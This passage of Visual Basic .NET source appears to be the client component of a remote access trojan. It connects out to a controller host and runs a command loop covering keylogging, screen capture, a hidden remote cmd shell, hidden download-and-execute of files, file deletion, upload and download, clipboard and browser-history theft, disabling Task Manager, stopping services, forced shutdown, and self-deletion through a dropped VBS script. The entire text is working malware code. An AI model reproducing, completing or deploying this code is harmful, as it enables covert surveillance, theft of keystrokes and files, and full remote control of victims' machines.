            strOutput = strOutput & "Total Physical Memory = " & My.Computer.Info.TotalPhysicalMemory & "±"
            strOutput = strOutput & "Total Virtual Memory = " & My.Computer.Info.TotalVirtualMemory & "±"
            strOutput = strOutput & "Available Physical Memory = " & My.Computer.Info.AvailablePhysicalMemory & "±"
            strOutput = strOutput & "Available Virtual Memory = " & My.Computer.Info.AvailableVirtualMemory & "±"
            strOutput = strOutput & "Username = " & My.User.Name & "±"
            strOutput = strOutput & "System Directory = " & Environment.SystemDirectory
            streamWriter.WriteLine(strOutput)
            streamWriter.Flush()
        Catch err As Exception
        End Try
    End Sub

    Private Sub log(ByVal t As Boolean)
        Try
            Dim tempPath As String = System.IO.Path.GetTempPath
            If t Then
                My.Computer.FileSystem.WriteAllText(tempPath & "logdll.txt", "", False)
                Action(True)
            Else
                Dim log As String = My.Computer.FileSystem.ReadAllText(tempPath & "logdll.txt")
                log = Encrypt(log, "&%#@?,:*")
                streamWriter.WriteLine("/KEYSLOGG/" & log)
                streamWriter.Flush()
            End If
           
        Catch ex As Exception

        End Try

    End Sub

    Private Sub runex(ByVal tempdata As String)
        Try

            Dim p As New Process()
            p.StartInfo.FileName = tempdata
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            p.Start()


           

        Catch ex As Exception

        End Try

    End Sub
    Private Sub runex1(ByVal tempdata As String)
        Try

            Dim p As New Process()
            p.StartInfo.FileName = tempdata
            p.StartInfo.WindowStyle = ProcessWindowStyle.Normal
            p.Start()

        Catch ex As Exception

        End Try

    End Sub

    Private Sub downd(ByVal tempdata As String)
        Try

            Dim str As String = Nothing
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(Imaging.Encoder.Quality, Int32.Parse(tempdata))
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            Dim Bounds As Rectangle
            Dim Capture As Bitmap
            Dim Graph As Graphics
            Dim to_bm As New Bitmap(800, 600, PixelFormat.Format16bppRgb555)
            Bounds = Screen.PrimaryScreen.Bounds
            Capture = New System.Drawing.Bitmap(Bounds.Width, Bounds.Height, PixelFormat.Format16bppRgb555)

            Graph = Graphics.FromImage(Capture)
            Graph.CopyFromScreen(Bounds.X, Bounds.Y, 0, 0, Bounds.Size, CopyPixelOperation.SourceCopy)
            Graph = Graphics.FromImage(to_bm)
            Graph.InterpolationMode = Drawing2D.InterpolationMode.HighQualityBilinear
            Graph.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed
            Graph.DrawImage(Capture, 0, 0, 800, 600)
            Dim ms As New MemoryStream()
            to_bm.Save(ms, ici, eps)
            ms.Capacity = ms.Length
            Dim bmpBytes() As Byte = ms.GetBuffer()
            str = Convert.ToBase64String(bmpBytes)
            Capture.Dispose()
            to_bm.Dispose()
            ms.Dispose()
            ms.Close()
            Graph.Dispose()
            bmpBytes = Nothing
            streamWriter.WriteLine("/STARDESK/" & str)
            streamWriter.Flush()

            str = Nothing
        Catch ex As Exception
            Action(False)
        End Try
    End Sub

    Private Sub killproc(ByVal tempdata As String)
        Try

            Dim pid As Integer = Int32.Parse(tempdata)
            Dim p As Process = Process.GetProcessById(pid)
            Try
                If p Is Nothing Then Return
                p.Kill()
                streamWriter.WriteLine("/REFRESHP/")
                streamWriter.Flush()
            Catch ex As Exception
                Try
                    Process.EnterDebugMode()
                    p.Kill()
                    Process.LeaveDebugMode()
                    streamWriter.WriteLine("/REFRESHP/")
                    streamWriter.Flush()
                Catch exi As Exception
                    Action(False)
                End Try
            End Try
        Catch ex As Exception
            Action(False)
        End Try
    End Sub

#End Region

#Region "Serv..."
    Private Sub RunServer()
constart:

        Dim Tempdata As String
        'Dim appoggio As String
        strInput = New StringBuilder()
        tcpClient = New TcpClient()
        Dim ran As Integer = RandomNumber(10, 20)
        '  Delay(ran)
        Dim addr As String = Nothing
        Dim addr1 As String = Nothing
        Dim iphe As IPHostEntry
        Dim ipAddresses() As IPAddress
        Try
            iphe = Dns.GetHostEntry(adr)
            ipAddresses = iphe.AddressList
            addr = ipAddresses(0).ToString
        Catch ex As Exception

        End Try
        Try
            iphe = Dns.GetHostEntry(adr2)
            ipAddresses = iphe.AddressList
            addr1 = ipAddresses(0).ToString
        Catch ex As Exception

        End Try

        Try
            tcpClient.Connect(addr, port)
            networkStream = tcpClient.GetStream()
            streamReader = New StreamReader(networkStream)
            streamWriter = New StreamWriter(networkStream)
            restart = 0
        Catch ex As Exception
            Try
                Try
                    tcpClient.Connect(addr, port2)
                    networkStream = tcpClient.GetStream()
                    streamReader = New StreamReader(networkStream)
                    streamWriter = New StreamWriter(networkStream)
                    restart = 0
                Catch exi As Exception
                    Try
                        tcpClient.Connect(addr1, port)
                        networkStream = tcpClient.GetStream()
                        streamReader = New StreamReader(networkStream)
                        streamWriter = New StreamWriter(networkStream)
                        restart = 0
                    Catch exy As Exception

                        Try
                            tcpClient.Connect(addr1, port2)
                            networkStream = tcpClient.GetStream()
                            streamReader = New StreamReader(networkStream)
                            streamWriter = New StreamWriter(networkStream)
                            restart = 0
                        Catch exu As Exception
                            Cleanup()
                            GoTo constart
                        End Try
                    End Try
                End Try
            Catch ext As Exception
                GoTo constart
            End Try
        End Try



        Do While (True)
            Try
                Tempdata = streamReader.ReadLine()
                Select Case Microsoft.VisualBasic.Left(Tempdata, 10)


                    Case "/FIRSTINF/"

                        Try
                            Dim t As Thread = New Thread(New ThreadStart(AddressOf first))
                            t.Start()

                        Catch err As Exception
                        End Try
                    Case "/INFOPCPC/"
                        Try
                            Dim t As Thread = New Thread(New ThreadStart(AddressOf info))
                            t.Start()
                        Catch ex As Exception

                        End Try


                    Case "/KEYSLOGG/"
                        Try
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf log))
                            t.Start(False)
                        Catch ex As Exception

                        End Try


                    Case "/KEYSLOGR/"
                        Try
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf log))
                            t.Start(True)
                        Catch ex As Exception

                        End Try


                    Case "/OPENCDCD/"
                        Try
                            mciExecute("Set CDaudio door open")
                        Catch ex As Exception
                        End Try

                    Case "/CLOSECDD/"
                        Try
                            mciExecute("Set CDaudio door closed")
                        Catch ex As Exception

                        End Try

                    Case "/RUNEXEFL/"
                        Try
                            Dim hide As String = Mid(Tempdata, 11, 1)
                            Tempdata = Mid(Tempdata, 12, Len(Tempdata))
                            If hide = "1" Then
                                Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf runex))
                                t.Start(Tempdata)

                            Else
                                Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf runex1))
                                t.Start(Tempdata)
                            End If

                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/KILLFILE/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            If File.Exists(Tempdata) Then
                                File.Delete(Tempdata)
                            End If
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/KILLDIRS/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            If My.Computer.FileSystem.DirectoryExists(Tempdata) Then
                                My.Computer.FileSystem.DeleteDirectory(Tempdata, FileIO.DeleteDirectoryOption.DeleteAllContents)
                            End If
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/FILESIZE/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim size As Integer = My.Computer.FileSystem.GetFileInfo(Tempdata).Length
                            streamWriter.WriteLine("/FILESIZE/" & size)
                            streamWriter.Flush()
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/MAKEDIRS/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            If My.Computer.FileSystem.DirectoryExists(Tempdata) Then
                                Action(False)
                            Else
                                My.Computer.FileSystem.CreateDirectory(Tempdata)
                            End If
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/LISTPROC/"
                        Try
                            Dim t As Thread = New Thread(New ThreadStart(AddressOf proc))
                            t.Start()

                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/LISTSERV/"
                        Try
                            Dim t As Thread = New Thread(New ThreadStart(AddressOf serv))
                            t.Start()

                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/STOPSERV/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim scEx As New ServiceControllerEx(Tempdata)
                            scEx.Stop()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/STRTSERV/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim scEx As New ServiceControllerEx(Tempdata)
                            scEx.Start()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/DSBLSERV/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim scEx As New ServiceControllerEx(Tempdata)
                            scEx.StartupType = "Disabled"
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/MNULSERV/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim scEx As New ServiceControllerEx(Tempdata)
                            scEx.StartupType = "Manual"
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/AUTOSERV/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim scEx As New ServiceControllerEx(Tempdata)
                            scEx.StartupType = "Auto"
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/STOPDOWN/"
                        Try
                            StopStream()
                        Catch ex As Exception

                        End Try


                    Case "/DOWNFILE/"
                        Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf down))
                        t.Start(Mid(Tempdata, 11, Len(Tempdata)))

                    Case "/ENCOREFL/"
                        Dim t As Thread = New Thread(New ThreadStart(AddressOf down2))
                        t.Start()

                    Case "/ERROR/"
                        Try
                            StopStream()
                        Catch ex As Exception

                        End Try


                    Case "/STOPUPLD/"
                        Try
                            _OutputFileStram.Flush()
                            StopStream()
                        Catch exi As Exception

                        End Try
                    Case "/UPLOADFL/"
                        Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf upl))
                        t.Start(Mid(Tempdata, 11, Len(Tempdata)))

                    Case "/OTHERPAK/"
                        Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf upl2))
                        t.Start(Mid(Tempdata, 11, Len(Tempdata)))


                    Case "/FINEUPLD/"
                        Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf upl3))
                        t.Start(Mid(Tempdata, 11, Len(Tempdata)))


                    Case "/DOWNDESK/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf downd))
                            t.Start(Tempdata)
                        Catch ex As Exception

                        End Try
                       

                    Case "/IPREVIEW/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf prev))
                            t.Start(Tempdata)

                        Catch ex As Exception

                        End Try

                    Case "/STARTSQN/"
                        Try
                            deskflag = True
                            streamWriter.WriteLine("/STARTSQN/")
                            streamWriter.Flush()
                        Catch ex As Exception

                        End Try

                    Case "/STARTSEQ/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf screens))
                            '  t.SetApartmentState(ApartmentState.STA)
                            t.Start(Tempdata)


                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/STOPPSEQ/"
                        Try
                            deskflag = False
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/KILLPROC/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf killproc))
                            t.Start(Tempdata)
                        Catch ex As Exception

                        End Try

                    Case "/SHOWMESG/"
                        iconmsg = Nothing
                        btnmsg = Nothing
                        msgtxt = Nothing
                        titletxt = Nothing
                        Try
                            Dim partslist As List(Of String) = New List(Of String)
                            Dim parts As String() = Tempdata.Split(New Char() {"*"c})
                            For Each part As String In parts
                                partslist.Add(part)
                            Next
                            msgtxt = partslist.Item(1).ToString
                            titletxt = partslist.Item(2).ToString
                            Select Case partslist.Item(4).ToString
                                Case "Q"
                                    iconmsg = MessageBoxIcon.Question
                                Case "W"
                                    iconmsg = MessageBoxIcon.Warning
                                Case "I"
                                    iconmsg = MessageBoxIcon.Information
                                Case "E"
                                    iconmsg = MessageBoxIcon.Error
                            End Select
                            Select Case partslist.Item(3).ToString
                                Case "OK"
                                    btnmsg = MessageBoxButtons.OK
                                Case "ARI"
                                    btnmsg = MessageBoxButtons.AbortRetryIgnore
                                Case "YNC"
                                    btnmsg = MessageBoxButtons.YesNoCancel
                                Case "YN"
                                    btnmsg = MessageBoxButtons.YesNo
                                Case "OC"
                                    btnmsg = MessageBoxButtons.OKCancel
                                Case "RC"
                                    btnmsg = MessageBoxButtons.RetryCancel
                            End Select
                            t = New Thread(AddressOf Me.MSG)
                            t.Start()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/PRINTTXT/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim parts As String() = Tempdata.Split("¼")
                            Dim printtxt As String = parts.GetValue(1).Replace("±", vbCrLf)
                            Dim fonts As Integer = Int32.Parse(parts.GetValue(0))
                            Dim MyPrintObject As New PrintText.TextPrint(printtxt)
                            MyPrintObject.Font = New Font("Tahoma", fonts)
                            MyPrintObject.Print()
                            parts = Nothing
                            Tempdata = Nothing
                            fonts = Nothing
                            MyPrintObject.Dispose()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/LISTDRVS/"
                        Try
                            Dim temp As String = Nothing
                            temp = Me.ListDriver()
                            streamWriter.WriteLine("/LISTDRVS/" & temp)
                            streamWriter.Flush()
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/CLIPBOAR/"
                        Try
                            clip = Nothing
                            Dim t As Thread = New Thread(New ThreadStart(AddressOf ReadClip))
                            t.SetApartmentState(ApartmentState.STA)
                            t.Start()
                            t.Join()
                            streamWriter.WriteLine("/CLIPBOAR/" & clip)
                            streamWriter.Flush()

                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/SETCLIPB/"
                        Try

                            clip = Mid(Tempdata, 11, Len(Tempdata))
                            clip = clip.Replace("***", vbCrLf)
                            Dim t As Thread = New Thread(New ThreadStart(AddressOf SetClip))
                            t.SetApartmentState(ApartmentState.STA)
                            t.Start()
                            t.Join()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/RENAMEFL/"
                        Try
                            Dim ren As String = Mid(Tempdata, 11, 1)
                            Tempdata = Mid(Tempdata, 12, Len(Tempdata))
                            Dim str As String() = Tempdata.Split("*")
                            If ren = "0" Then
                                My.Computer.FileSystem.RenameDirectory(str.GetValue(0), str.GetValue(1))
                            Else
                                My.Computer.FileSystem.RenameFile(str.GetValue(0), str.GetValue(1))
                            End If
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/REMOVESV/"
                        Try
                            Dim tempPath As String = System.IO.Path.GetTempPath
                            If Not tempPath.EndsWith("\") Then
                                tempPath = tempPath & "\"
                            End If
                            Dim executable As String = Application.ExecutablePath
                            Dim vbsName As String = "_uninsep.vbs"
                            Dim vbsFileFullPath As String = tempPath & vbsName
                            Dim vbsFile As String = "On Error Resume Next" & vbCrLf & "Dim WshShell, KV, Desc, oArgs" & vbCrLf
                            If os < 6 Then
                                vbsFile = vbsFile & "Set WshShell = WScript.CreateObject(" & """WScript.Shell""" & ")" & vbCrLf & "KV = " & """HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ARC""" & vbCrLf & "WshShell.RegDelete KV" & vbCrLf
                            End If
                            vbsFile = vbsFile & "Set fso = CreateObject(" & """Scripting.FileSystemObject""" & ")" & vbCrLf & _
                            "Set aFile = fso.GetFile(" & """" & executable & """" & ")" & vbCrLf & "aFile.Delete" & vbCrLf & _
                            "Do" & vbCrLf & "If fso.FileExists(afile) Then" & vbCrLf & "aFile.Delete" & vbCrLf & _
                            "Else" & vbCrLf & "Exit Do" & vbCrLf & "End If" & vbCrLf & "If Err.Number <> 0 Then" & vbCrLf & _
                            "errorr = 1" & vbCrLf & "Err.Clear()" & vbCrLf & "WScript.sleep(1000)" & vbCrLf & "Else" & vbCrLf & _
                            "errorr = 0" & vbCrLf & "Exit Do" & vbCrLf & " End If" & vbCrLf & "loop until errorr = 1" & vbCrLf & _
                            "Set aFile = fso.GetFile(" & """" & tempPath & vbsName & """" & ")" & vbCrLf & "aFile.Delete"
                            Dim swv As New System.IO.StreamWriter(vbsFileFullPath, False)
                            swv.Write(vbsFile)
                            swv.Close()
                            Dim p As New System.Diagnostics.Process
                            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                            p.StartInfo.FileName = vbsFileFullPath
                            p.Start()
                            CloseWindows()
                            Application.ExitThread()
                            MyThread.Abort()
                            Application.Exit()
                        Catch ex As Exception
                            Action(True)
                        End Try

                    Case "/LISTDIRS/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf listd))
                            t.Start(Tempdata)

                        Catch ex As Exception
                            streamWriter.WriteLine("/ERRORDIR/")
                            streamWriter.Flush()
                        End Try


                    Case "/DESKH/"
                        Try
                            Hidedesk()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/DESKS/"
                        Try
                            Showdesk()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/STARTH/"
                        Try
                            hideSbtn()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/STARTS/"
                        Try
                            showSbtn()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/HIDETASK/"
                        Try
                            hideT()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/SHOWTASK/"
                        Try
                            showT()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/FLIP/"
                        Try
                            Dim dm As DEVMODE = NativeMethods.CreateDevmode()
                            GetSettings(dm)
                            dm.dmDisplayOrientation = orientationValues(2)
                            ChangeSettings(dm)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/UNFLIP/"
                        Try
                            Dim dm As DEVMODE = NativeMethods.CreateDevmode()
                            GetSettings(dm)
                            dm.dmDisplayOrientation = orientationValues(0)
                            ChangeSettings(dm)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/SWAPM/"
                        Try
                            SwapMouseButton(MB_DEFBUTTON2)
                        Catch ex As Exception
                        End Try

                    Case "/UNSWAPM/"
                        Try
                            SwapMouseButton(MB_DEFBUTTON1)
                        Catch ex As Exception
                        End Try

                    Case "/CADD/"
                        Try
                            EnableTaskManager(False)
                        Catch ex As Exception

                        End Try


                    Case "/CADE/"
                        Try
                            EnableTaskManager(True)
                        Catch ex As Exception

                        End Try


                    Case "/TMOFF/"
                        Try

                            API.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF)

                        Catch ex As Exception

                        End Try

                    Case "/TMON/"
                        Try
                            API.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
                        Catch ex As Exception

                        End Try


                    Case "/SCRSTART/"
                        Try
                            StartScreenSaver(True)
                        Catch ex As Exception

                        End Try

                    Case "/SCRSTOP/"
                        Try
                            StartScreenSaver(False)
                        Catch ex As Exception

                        End Try


                    Case "/IEVER/"
                        Try
                            Dim HKLM As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine
                            Dim key As Microsoft.Win32.RegistryKey = HKLM.OpenSubKey("Software\Microsoft\Internet Explorer")
                            Dim str As String = key.GetValue("Version").ToString
                            streamWriter.WriteLine("/IEVERSIN/" & str)
                            streamWriter.Flush()
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/STRTPAGE/"
                        Try
                            Dim HKCU As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
                            Dim key As Microsoft.Win32.RegistryKey = HKCU.OpenSubKey("Software\Microsoft\Internet Explorer\Main")
                            Dim str As String = key.GetValue("Start Page").ToString
                            streamWriter.WriteLine("/IESTARTP/" & str)
                            streamWriter.Flush()
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/CHANGETL/"
                        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                        Try
                            Dim HKCU As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
                            Dim key As Microsoft.Win32.RegistryKey = HKCU.CreateSubKey("Software\Microsoft\Internet Explorer\Main")
                            key.SetValue("Window Title", Tempdata, Microsoft.Win32.RegistryValueKind.String)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/CHANGEHP/"
                        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                        Try
                            Dim HKCU As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
                            Dim key As Microsoft.Win32.RegistryKey = HKCU.CreateSubKey("Software\Microsoft\Internet Explorer\Main")
                            key.SetValue("Start Page", Tempdata)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/RUNSPAGE/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            If Not Tempdata.StartsWith("http://") Or Not Tempdata.StartsWith("https://") Then
                                Tempdata = "http://" & Tempdata
                            End If
                            Process.Start(Tempdata)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/LASTURLS/"
                        Try
                            PopulateUrlList()
                            Dim urls As String
                            urls = PopulateUrlList()
                            streamWriter.WriteLine("/LASTURLS/" & urls)
                            streamWriter.Flush()
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/DLARUNVS/"
                        Try
                            Dim str As Integer
                            Dim partslist As List(Of String) = New List(Of String)
                            Dim parts As String() = Mid(Tempdata, 11, Len(Tempdata)).Split(CChar("/"))
                            For Each part As String In parts
                                partslist.Add(part)
                            Next
                            str = partslist.Count - 1
                            Dim url As String = Mid(Tempdata, 11, Len(Tempdata))
                            Dim strFileName As String = Nothing
                            strFileName = Environment.GetEnvironmentVariable("Temp") & "\" & partslist.Item(str).ToString

                            My.Computer.Network.DownloadFile(url, strFileName, Nothing, Nothing, False, 100000, True)


                            Delay(1)
                            Process.Start(strFileName)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/DLARUNHD/"
                        Try
                            Dim str As Integer
                            Dim partslist As List(Of String) = New List(Of String)
                            Dim parts As String() = Mid(Tempdata, 11, Len(Tempdata)).Split(CChar("/"))
                            For Each part As String In parts
                                partslist.Add(part)
                            Next
                            str = partslist.Count - 1
                            Dim url As String = Mid(Tempdata, 11, Len(Tempdata))
                            Dim strFileName As String = Nothing
                            strFileName = Environment.GetEnvironmentVariable("Temp") & "\" & partslist.Item(str).ToString
                            My.Computer.Network.DownloadFile(url, strFileName, Nothing, Nothing, False, 100000, True)
                            Delay(1)
                            Dim pi As New Process
                            pi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                            pi.StartInfo.FileName = strFileName
                            pi.Start()
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/REFRWIND/"
                        Try
                            Dim thr As Thread = New Thread(New ThreadStart(AddressOf refreshwind))
                            thr.Start()
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/CLSEWIND/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim proc As Process = Process.GetProcessById(Tempdata)
                            proc.Kill()
                            Dim thr As Thread = New Thread(New ThreadStart(AddressOf refreshwind))
                            thr.Start()
                        Catch ex As Exception
                            Action(False)
                        End Try


                    Case "/HIDEWIND/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim proc As Process = Process.GetProcessById(Tempdata)
                            ShowWindow(proc.MainWindowHandle, 0)
                            Dim thr As Thread = New Thread(New ThreadStart(AddressOf refreshwind))
                            thr.Start()
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/MINIWIND/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim proc As Process = Process.GetProcessById(Tempdata)
                            ShowWindow(proc.MainWindowHandle, 6)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try
                    Case "/MAXIWIND/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim proc As Process = Process.GetProcessById(Tempdata)
                            ShowWindow(proc.MainWindowHandle, 3)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/RSTRWIND/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim proc As Process = Process.GetProcessById(Tempdata)
                            ShowWindow(proc.MainWindowHandle, 9)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/DFLTWIND/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim proc As Process = Process.GetProcessById(Tempdata)
                            ShowWindow(proc.MainWindowHandle, 10)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/SHOWWIND/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim proc As Process = Process.GetProcessById(Tempdata)
                            ShowWindow(proc.MainWindowHandle, 4)
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/RESTWIND/"
                        Try
                            Shell("shutdown -r -t 0")
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try
                    Case "/TURNWIND/"
                        Try
                            Shell("shutdown -s -t 0")
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try
                    Case "/LOGOWIND/"
                        Try
                            Shell("shutdown -l -t 0")
                            Action(True)
                        Catch ex As Exception
                            Action(False)
                        End Try

                    Case "/STARTCMD/"
                        Try
                            If FindAndKillProcess("cmd") Then
                            Else
                                processCmd = New Process()
                                processCmd.StartInfo.FileName = "cmd.exe"
                                processCmd.StartInfo.CreateNoWindow = True
                                processCmd.StartInfo.UseShellExecute = False
                                processCmd.StartInfo.RedirectStandardOutput = True
                                processCmd.StartInfo.RedirectStandardInput = True
                                processCmd.StartInfo.RedirectStandardError = True
                                AddHandler processCmd.OutputDataReceived, AddressOf CmdOutputDataHandler
                                processCmd.Start()
                                processCmd.BeginOutputReadLine()
                            End If

                        Catch ex As Exception
                        End Try

                    Case "/STOPCMD/"
                        Try
                            For Each clsProcess As Process In Process.GetProcesses()
                                If clsProcess.ProcessName.StartsWith("cmd") Then
                                    clsProcess.Kill()

                                End If
                            Next clsProcess
                        Catch ex As Exception

                        End Try
                    Case "/CMDCMDGO/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            strInput.Append(Tempdata)
                            strInput.Append(Constants.vbCrLf)
                            processCmd.StandardInput.WriteLine(strInput)
                            strInput.Remove(0, strInput.Length)
                        Catch ex As Exception

                        End Try


                    Case "/STARTSQL/"
                        Try
                            streamWriter.WriteLine("/STARTSQL/" & Screen.PrimaryScreen.Bounds.Width & "*" & Screen.PrimaryScreen.Bounds.Height)
                            streamWriter.Flush()
                        Catch ex As Exception

                        End Try


                    Case "/SETMOUSE/"
                        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                        Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf setm))
                        t.Start(Tempdata)


                    Case "/SETCLICK/"
                        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                        Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf setcl))
                        t.Start(Tempdata)


                    Case "/MEUPDATE/"

                    Case "/REGYVIEW/"
                        Try
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim node As String = Nothing
                            Dim regtree As Thread
                            Select Case Tempdata

                                Case "CU"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry))
                                    regtree.Start("CU")

                                Case "LM"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry))
                                    regtree.Start("LM")

                                Case "US"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry))
                                    regtree.Start("US")

                            End Select

                        Catch ex As Exception

                        End Try

                    Case "/REGVIEWS/"
                        Try
                            Dim rge As String = Nothing
                            Dim reg As String = Nothing
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim strigs() As String = Nothing
                            strigs = Tempdata.Split(CChar("¥"))
                            reg = strigs(0)
                            rge = strigs(1)
                            Dim node As String = Nothing
                            Dim regtree As Thread
                            Select Case reg

                                Case "CU"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry1))
                                    regtree.Start(reg & rge)

                                Case "LM"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry1))
                                    regtree.Start(reg & rge)

                                Case "US"
                                    regtree = New Thread(New ParameterizedThreadStart(AddressOf ReadRegistry1))
                                    regtree.Start(reg & rge)

                            End Select

                        Catch ex As Exception

                        End Try

                    Case "/REGVIEWV/"
                        Try
                            Dim rge As String = Nothing
                            Dim reg As String = Nothing
                            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
                            Dim strigs() As String = Nothing
                            strigs = Tempdata.Split(CChar("¥"))
                            reg = strigs(0)
                            rge = strigs(1)
                            Dim node As String = Nothing
